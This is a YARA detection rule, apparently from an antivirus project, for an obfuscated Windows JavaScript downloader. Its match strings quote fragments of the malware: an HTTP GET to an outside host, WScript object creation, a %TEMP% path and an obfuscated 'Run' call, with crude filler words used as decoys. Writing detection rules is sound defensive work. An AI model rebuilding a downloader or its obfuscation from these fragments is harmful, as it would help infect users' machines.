rule sig_20160428_4840ddb224caaaffd7cbd0d4b548d75c {
  meta:
    description = "datamaliciousorder - file 20160428_4840ddb224caaaffd7cbd0d4b548d75c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9808c3eb36973fc1a9bcc6316f07316e7cc6a7e71416dea4a0ac1949cb2572dd"

  strings:
    $s1  = "SbtKviSviNxnWgzPvaRdh[LekGpvOwxUuuMwtRupQaj](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function UtpOnoQevNgdNezCdbSsm() {return AucMixBipJeeDskAdqWeu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function KosWemCbjObwZvnAfmWvq(HfcKzgJfuOrzRwxSylMqs){AucMixBipJeeDskAdqWeu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function KosWemCbjObwZvnAfmWvq(HfcKzgJfuOrzRwxSylMqs){AucMixBipJeeDskAdqWeu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var AucMixBipJeeDskAdqWeu = function NofCweGfrZjlZamZnnFod() {return JwtNffMhtSaiYouHbpXhw[OmpAenSebLrgEmeUfjDcq](\"WScript\"+\"" ascii
    $s6  = "function VcbCbnMinQbrFnrBeqGei(DfqWccTxiLxlWtgRvcBbb, NzhUsyDybVelAdrQlxAav){FmaIncWeqQuqXbwCrjFqi = FmaIncWeqQuqXbwCrjFqi * 1; " ascii
    $s7  = "return DfqWccTxiLxlWtgRvcBbb - NzhUsyDybVelAdrQlxAav;};" fullword ascii
    $s8  = "var AucMixBipJeeDskAdqWeu = function NofCweGfrZjlZamZnnFod() {return JwtNffMhtSaiYouHbpXhw[OmpAenSebLrgEmeUfjDcq](\"WScript\"+\"" ascii
    $s9  = "var JwtNffMhtSaiYouHbpXhw = this[\"WScript\"];" fullword ascii
    $s10 = "function UtpOnoQevNgdNezCdbSsm() {return AucMixBipJeeDskAdqWeu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function VcbCbnMinQbrFnrBeqGei(DfqWccTxiLxlWtgRvcBbb, NzhUsyDybVelAdrQlxAav){FmaIncWeqQuqXbwCrjFqi = FmaIncWeqQuqXbwCrjFqi * 1; " ascii
    $s12 = "function QajQmmXujUncRkhZkmJiz(){return PdzWynZdpHxkDgqStzNvk + \"\";};" fullword ascii
    $s13 = "if (SbtKviSviNxnWgzPvaRdh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function GbhBleYphWlmIzqQlaVht() {return ((IujCbzZxtEopZipHfxGoy == true) && (IujCbzZxtEopZipHfxGoy == JvnAyfKslYxjVipCtsQlm)) ?" ascii
    $s15 = "function GbhBleYphWlmIzqQlaVht() {return ((IujCbzZxtEopZipHfxGoy == true) && (IujCbzZxtEopZipHfxGoy == JvnAyfKslYxjVipCtsQlm)) ?" ascii
    $s16 = "return VcbCbnMinQbrFnrBeqGei(1 == 1 ? WyfQqrGhsTtdHcpZajMxb : 0, 1 == 1 ? VrnJcyVteWcyJxiZjcUle : 0);" fullword ascii
    $s17 = "function KdfGrdNshLznAxlLxvFpf(){return 23;};" fullword ascii
    $s18 = "var JvnAyfKslYxjVipCtsQlm = false;" fullword ascii
    $s19 = "}while (MseEngQtjIxeUfqUvsFcu);" fullword ascii
    $s20 = "function SqgZetYguAcnKgnGurHjm()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}